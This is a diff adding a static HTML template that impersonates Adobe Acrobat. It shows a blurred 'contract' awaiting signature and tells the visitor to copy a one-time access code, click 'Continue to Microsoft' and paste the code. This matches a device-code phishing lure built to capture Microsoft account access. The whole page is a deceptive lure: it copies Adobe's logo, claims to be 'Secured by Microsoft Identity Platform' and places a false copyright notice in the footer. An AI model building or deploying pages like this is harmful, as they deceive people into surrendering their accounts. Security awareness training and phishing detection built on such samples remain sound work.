@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Preview - Adobe Acrobat Template</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; font-family: 'Inter', sans-serif; }
+    body { background: #1a1a1a; display: flex; flex-direction: column; min-height: 100vh; }
+
+    .preview-badge {
+      position: fixed; top: 20px; right: 20px;
+      background: #ff6b6b; color: white;
+      padding: 8px 16px; border-radius: 20px;
+      font-size: 12px; font-weight: 600;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.3); z-index: 1000;
+    }
+
+    /* Header */
+    .header { background: #2b2b2b; border-bottom: 1px solid #3a3a3a; height: 52px; display: flex; align-items: center; padding: 0 24px; gap: 14px; flex-shrink: 0; }
+    .header-logo { display: flex; align-items: center; gap: 10px; }
+    .header-title { font-size: 15px; font-weight: 600; color: #f8f8f8; }
+    .header-sep { width: 1px; height: 18px; background: #4a4a4a; margin: 0 4px; }
+    .header-sub { font-size: 13px; color: #999; }
+    .header-right { margin-left: auto; }
+    .head-btn { background: #FA0F00; color: #fff; border: none; padding: 6px 16px; border-radius: 4px; font-size: 13px; font-weight: 600; }
+
+    /* Main */
+    .main { flex: 1; display: flex; overflow: hidden; }
+
+    /* PDF pane */
+    .preview-pane { flex: 1; background: #3c3c3c; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+    .pdf-thumb { width: 340px; height: 440px; background: #fff; border-radius: 2px; box-shadow: 0 20px 60px rgba(0,0,0,.6); display: flex; flex-direction: column; overflow: hidden; }
+    .pdf-stripe { height: 6px; background: #FA0F00; }
+    .pdf-content { flex: 1; padding: 28px 24px; display: flex; flex-direction: column; gap: 10px; }
+    .pdf-line { height: 10px; background: #e5e5e5; border-radius: 2px; }
+    .pdf-line.title { height: 16px; background: #333; width: 75%; margin-bottom: 8px; }
+    .pdf-logo-area { display: flex; align-items: center; gap: 8px; margin-bottom: 16px; }
+    .pdf-logo-box { width: 32px; height: 32px; background: #FA0F00; border-radius: 4px; display: flex; align-items: center; justify-content: center; }
+    .pdf-company { font-size: 13px; font-weight: 600; color: #333; }
+    .pdf-footer { padding: 16px 24px; border-top: 1px solid #f0f0f0; display: flex; justify-content: space-between; align-items: center; }
+    .pdf-page { font-size: 11px; color: #999; }
+    .pdf-badge { background: #FFF0F0; color: #FA0F00; font-size: 10px; font-weight: 600; padding: 3px 8px; border-radius: 10px; border: 1px solid #FFCCCC; }
+    .preview-overlay { position: absolute; inset: 0; background: rgba(0,0,0,.15); display: flex; align-items: center; justify-content: center; pointer-events: none; }
+    .blur-notice { background: rgba(0,0,0,.6); color: #fff; padding: 10px 20px; border-radius: 20px; font-size: 13px; font-weight: 500; backdrop-filter: blur(4px); }
+
+    /* Side panel */
+    .side-panel { width: 400px; flex-shrink: 0; background: #242424; border-left: 1px solid #333; display: flex; flex-direction: column; overflow-y: auto; padding: 28px; }
+    .doc-info { display: flex; align-items: center; gap: 12px; padding: 14px 16px; background: #2e2e2e; border-radius: 8px; border: 1px solid #383838; margin-bottom: 24px; }
+    .doc-icon { width: 36px; height: 36px; background: #FA0F00; border-radius: 6px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .doc-name { font-size: 13px; font-weight: 600; color: #f0f0f0; }
+    .doc-meta { font-size: 11px; color: #777; margin-top: 2px; }
+    .doc-status { margin-left: auto; background: #3a2020; color: #FA0F00; font-size: 10px; font-weight: 700; text-transform: uppercase; padding: 4px 8px; border-radius: 4px; border: 1px solid #5a2020; white-space: nowrap; }
+    .verify-title { font-size: 19px; font-weight: 700; color: #f8f8f8; margin-bottom: 6px; }
+    .verify-desc { font-size: 13px; color: #888; line-height: 1.6; margin-bottom: 22px; }
+    .code-block { background: #1a1a1a; border: 1px solid #FA0F0033; border-radius: 10px; padding: 18px 20px; margin-bottom: 18px; }
+    .code-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px; color: #FA0F00; font-weight: 700; margin-bottom: 10px; }
+    .code-value { font-size: 28px; font-weight: 700; color: #fff; font-family: 'Courier New', monospace; letter-spacing: 8px; display: block; }
+    .copy-btn { margin-top: 12px; background: transparent; border: 1px solid #FA0F00; color: #FA0F00; padding: 7px 18px; border-radius: 4px; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 6px; }
+    .steps-block { background: #1e1e1e; border-radius: 8px; padding: 14px 16px; margin-bottom: 20px; }
+    .step-row { display: flex; align-items: center; gap: 10px; padding: 6px 0; font-size: 13px; color: #aaa; }
+    .step-row:not(:last-child) { border-bottom: 1px solid #2a2a2a; }
+    .step-num { width: 22px; height: 22px; background: #FA0F00; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; flex-shrink: 0; }
+    .cta-btn { width: 100%; height: 50px; background: linear-gradient(135deg, #FA0F00, #c20000); border: none; border-radius: 6px; color: #fff; font-size: 15px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 14px; box-shadow: 0 4px 20px rgba(250,15,0,.3); }
+    .security-row { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 11px; color: #555; }
+
+    /* Footer */
+    .footer { background: #1e1e1e; border-top: 1px solid #333; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; flex-shrink: 0; }
+    .footer-copy { font-size: 11px; color: #555; }
+    .footer-links { display: flex; gap: 16px; }
+    .footer-links a { font-size: 11px; color: #555; text-decoration: none; }
+
+    @media (max-width: 768px) { .preview-pane { display: none; } .side-panel { width: 100%; border-left: none; } }
+  </style>
+</head>
+<body>
+  <div class="preview-badge">PREVIEW MODE</div>
+
+  <header class="header">
+    <div class="header-logo">
+      <svg height="22" viewBox="0 0 217 46" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Adobe">
+        <path d="M0 0h31.5v46H0V0z" fill="#FA0F00"/>
+        <path d="M12.7 9.3L3.2 37h6.5l1.9-5.8h9.7l1.9 5.8h6.5L20.2 9.3h-7.5zm-.6 16.9l3.4-10.4 3.4 10.4h-6.8z" fill="#fff"/>
+        <path d="M55.4 10.2c-3.7 0-7 1-9.7 3V0h-6.2v37h5.7l.3-2.3c2.6 2 5.8 3 9.2 3 8.1 0 13.9-6 13.9-13.9 0-7.7-5.5-13.6-13.2-13.6zm-.8 21.7c-2.5 0-4.8-.8-6.5-2.1V19.5c1.9-1.5 4.1-2.4 6.5-2.4 4.5 0 7.6 3.3 7.6 7.7 0 4.1-3 7.1-7.6 7.1zM90.5 10.2c-8.3 0-14.1 5.9-14.1 13.8 0 8.2 5.9 13.7 14.6 13.7 4 0 7.6-1.1 10.3-3.2l-2.8-4.2c-2 1.5-4.4 2.4-7.2 2.4-4.3 0-7.5-2.4-8.3-6.2h20.5c.1-.8.2-1.6.2-2.3 0-8.2-5.3-14-13.2-14zm-7.5 11.4c.7-3.8 3.4-6.2 7.3-6.2 3.8 0 6.5 2.4 7 6.2H83zM121.5 10.2c-3.5 0-6.5 1-8.9 2.7l-.3-2h-5.7v37h6.2V35c2.3 1.5 5.1 2.4 8.2 2.4 7.7 0 13.3-6 13.3-13.6 0-7.9-5.6-13.6-12.8-13.6zm-.9 21.7c-2.5 0-4.8-.9-6.5-2.3V19.5c1.8-1.5 4-2.4 6.5-2.4 4.1 0 7.2 3.2 7.2 7.6 0 4.1-3 7.2-7.2 7.2zM148 0h-6.2v37h6.2V0zM167.5 10.2c-8.3 0-14.3 5.9-14.3 13.8 0 7.9 6 13.7 14.3 13.7s14.3-5.8 14.3-13.7c0-7.9-6-13.8-14.3-13.8zm0 21.7c-4.5 0-7.8-3.3-7.8-7.9 0-4.6 3.3-7.9 7.8-7.9s7.8 3.3 7.8 7.9c0 4.6-3.3 7.9-7.8 7.9z" fill="#FA0F00"/>
+      </svg>
+    </div>
+    <div class="header-sep"></div>
+    <span class="header-sub">Shared Document</span>
+    <div class="header-right">
+      <button class="head-btn">Sign Document</button>
+    </div>
+  </header>
+
+  <div class="main">
+    <div class="preview-pane">
+      <div class="pdf-thumb">
+        <div class="pdf-stripe"></div>
+        <div class="pdf-content">
+          <div class="pdf-logo-area">
+            <div class="pdf-logo-box">
+              <svg width="18" height="18" viewBox="0 0 30 30" fill="none">
+                <path d="M15 3L23 22H18.5L15 15L11.5 22H7L15 3Z" fill="white"/>
+              </svg>
+            </div>
+            <span class="pdf-company">Adobe Acrobat</span>
+          </div>
+          <div class="pdf-line title"></div>
+          <div class="pdf-line"></div>
+          <div class="pdf-line" style="width:60%"></div>
+          <div class="pdf-line"></div>
+          <div class="pdf-line" style="width:40%"></div>
+          <div class="pdf-line"></div>
+          <div class="pdf-line" style="width:60%"></div>
+          <div class="pdf-line" style="height:60px; background:#f5f5f5; border-radius:4px; margin-top:8px;"></div>
+          <div class="pdf-line"></div>
+          <div class="pdf-line" style="width:40%"></div>
+          <div class="pdf-line"></div>
+        </div>
+        <div class="pdf-footer">
+          <span class="pdf-page">Page 1 of 3</span>
+          <span class="pdf-badge">⚡ Signature Required</span>
+        </div>
+      </div>
+      <div class="preview-overlay">
+        <div class="blur-notice">🔒 Verify identity to unlock full document</div>
+      </div>
+    </div>
+
+    <div class="side-panel">
+      <div class="doc-info">
+        <div class="doc-icon">
+          <svg width="18" height="22" viewBox="0 0 18 22" fill="none">
+            <path d="M11 1H3C2.47 1 1.96 1.21 1.59 1.59C1.21 1.96 1 2.47 1 3V19C1 19.53 1.21 20.04 1.59 20.41C1.96 20.79 2.47 21 3 21H15C15.53 21 16.04 20.79 16.41 20.41C16.79 20.04 17 19.53 17 19V7L11 1Z" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M11 1V7H17" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <div>
+          <div class="doc-name">Contract_Agreement_2026.pdf</div>
+          <div class="doc-meta">Shared via Adobe Acrobat • 2.4 MB</div>
+        </div>
+        <div class="doc-status">Awaiting Signature</div>
+      </div>
+
+      <div class="verify-title">Identity Verification Required</div>
+      <div class="verify-desc">This document is protected. Verify your Microsoft account to unlock and digitally sign.</div>
+
+      <div class="code-block">
+        <div class="code-label">Your One-Time Access Code</div>
+        <span class="code-value">XXXX-XXXX</span>
+        <button class="copy-btn">
+          <svg width="13" height="13" viewBox="0 0 20 20" fill="currentColor"><path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z"/><path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z"/></svg>
+          Copy Code
+        </button>
+      </div>
+
+      <div class="steps-block">
+        <div class="step-row"><div class="step-num">1</div>Copy the access code above</div>
+        <div class="step-row"><div class="step-num">2</div>Click "Continue to Microsoft" below</div>
+        <div class="step-row"><div class="step-num">3</div>Paste the code (Ctrl+V) when prompted</div>
+      </div>
+
+      <button class="cta-btn">
+        <svg width="18" height="18" viewBox="0 0 21 21" fill="currentColor">
+          <path d="M0 0h10v10H0zM11 0h10v10H11zM0 11h10v10H0zM11 11h10v10H11z"/>
+        </svg>
+        Continue to Microsoft
+      </button>
+
+      <div class="security-row">
+        <svg width="13" height="13" viewBox="0 0 20 20" fill="#4CAF50">
+          <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+        </svg>
+        Secured by Microsoft Identity Platform
+      </div>
+    </div>
+  </div>
+
+  <footer class="footer">
+    <span class="footer-copy">© 2026 Adobe Inc. All rights reserved.</span>
+    <div class="footer-links">
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Cookie Preferences</a>
+    </div>
+  </footer>
+</body>
+</html>
